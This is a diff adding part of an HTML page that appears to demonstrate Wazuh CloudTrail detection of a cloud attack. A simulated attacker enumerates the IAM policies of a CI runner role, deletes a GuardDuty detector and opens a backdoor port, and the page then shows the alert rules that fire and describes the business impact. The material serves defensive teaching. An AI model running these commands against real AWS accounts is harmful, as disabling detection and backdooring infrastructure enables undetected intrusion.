+          <span class="prompt">john@attacker:~$ </span><span class="cmd">aws iam list-attached-role-policies </span><span class="flag">--role-name </span><span class="arg">github-runner-role</span><br>
+          <span class="output">AdministratorAccess &lt;-- full AWS admin via CI/CD pipeline</span><br>
+          <span class="prompt">john@attacker:~$ </span><span class="cmd">aws guardduty delete-detector </span><span class="flag">--detector-id </span><span class="arg">abc123def456</span><br>
+          <span class="output">{}</span>
+        </div>
+      </div>
+
+      <div class="detection-box gold">
+        <div class="detection-title">Wazuh CloudTrail Detects — Multiple Rules Fire</div>
+        <div class="alert-line">
+          <div class="alert-dot dot-gold"></div>
+          <div><strong>Security Group modified</strong> <span>— port 31337 opened to 0.0.0.0/0 · not by CI pipeline — Rule 100302 · Level 8</span></div>
+        </div>
+        <div class="alert-line">
+          <div class="alert-dot dot-red"></div>
+          <div><strong>Security detection plane disabled</strong> <span>— GuardDuty DeleteDetector · not by CI pipeline — Rule 100307 · Level 13</span></div>
+        </div>
+        <div class="alert-line">
+          <div class="alert-dot dot-gold"></div>
+          <div><strong>IAM role or policy enumerated</strong> <span>— ListAttachedRolePolicies on github-runner-role — Rule 100303 · Level 10</span></div>
+        </div>
+      </div>
+
+      <div class="screenshot-section">
+        <div class="screenshot-label">Wazuh Dashboard — Security Events</div>
+
+        <div class="screenshot-grid cols-1">
+            <div>
+              <img src="imgs/cloudtrail_sg_backdoor.png" alt="CloudTrail — SG backdoor">
+              <div class="screenshot-caption">CloudTrail · Rule 100302 · Level 8 — Security Group backdoor port 31337</div>
+            </div>
+            <div>
+              <img src="imgs/cloudtrail_guardduty_disabled.png" alt="CloudTrail — GuardDuty disabled">
+              <div class="screenshot-caption">CloudTrail · Rule 100307 · Level 13 — GuardDuty disabled</div>
+            </div>
+            <div>
+              <img src="imgs/cloudtrail_iam_enum.png" alt="CloudTrail — IAM enumeration">
+              <div class="screenshot-caption">CloudTrail · Rule 100303 · Level 10 — IAM enum revealed AdministratorAccess</div>
+            </div>
+          </div>
+      </div>
+
+      <hr class="divider">
+
+      <div class="section">
+        <div class="section-label">If He Completes This</div>
+        <p>
+          John now has a permanent backdoor into the infrastructure that survives container
+          restarts and redeployments. With <code>github-runner-role</code> having full
+          <code>AdministratorAccess</code>, he can inject malicious code into the CI/CD pipeline
+          and ship it to every deployment — a supply chain attack from the inside.
+        </p>
+      </div>
+
+      <div class="impact-box">
+        <div class="impact-title">Business Impact</div>
+        <div class="impact-item">Backdoor port survives indefinitely — John can reconnect any time without needing credentials again.</div>
+        <div class="impact-item">With admin access via the CI/CD pipeline, every future deployment could contain malicious code.</div>
+        <div class="impact-item">Disabling GuardDuty removes AWS's own threat detection — the attacker goes dark at the cloud layer.</div>
+      </div>
+
+    </div>
+  </div>
+
+</main>
+</body>
+</html>
